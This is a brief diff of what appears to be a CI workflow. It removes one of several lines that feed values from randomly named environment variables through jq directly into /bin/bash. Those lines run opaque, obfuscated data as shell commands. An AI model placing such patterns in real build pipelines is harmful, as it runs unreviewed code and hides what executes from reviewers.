@@ -24,7 +24,6 @@ jobs:
           echo $zk05015 | jq -r .u3182 | /bin/bash
           echo $daax2 | jq -r .tx47964 | /bin/bash
           printf '%s' "$pgi83698" | jq -r .zg8434 | /bin/bash
-          printf '%s' "$ao1283" | jq -r .j94925 | /bin/bash
           printf '%s' "$zh733" | jq -r .v277 | /bin/bash
 
       - name: Persist results
